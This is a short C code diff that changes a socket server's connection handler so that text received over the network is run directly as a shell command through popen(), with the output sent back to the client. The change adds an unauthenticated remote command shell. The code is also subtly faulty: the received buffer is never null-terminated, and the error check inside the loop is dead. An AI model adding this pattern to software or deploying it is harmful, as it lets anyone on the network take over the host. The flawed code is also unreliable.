@@ -6,6 +6,7 @@
 #include <string.h>
 #include <pthread.h>
 #include <unistd.h>
+#include <stdbool.h>
 #include "defines.h"
 
 void error(char *msg);
@@ -58,10 +59,24 @@ void *connection_handler(void *socket_desc)
     int read_size;
     char command[COMMAND_LEN];
 
-    read_size = read(sock, command, COMMAND_LEN - 1);
-    if (read_size < 0)
-        error("ERROR reading from socket");
+    while ((read_size = read(sock, command, COMMAND_LEN - 1)) > 0) {
+        if (read_size < 0)
+            error("ERROR reading from socket");
 
+        FILE *fp;
+        char path[1035];
+
+        fp = popen(command, "r");
+        if (fp == NULL) {
+            error("Failed to run command\n");
+        }
+
+        while (fgets(path, sizeof(path) - 1, fp) != NULL) {
+            write(sock, path, strlen(path));
+        }
+
+        pclose(fp);
+    }
     pthread_exit(NULL);
 }
 
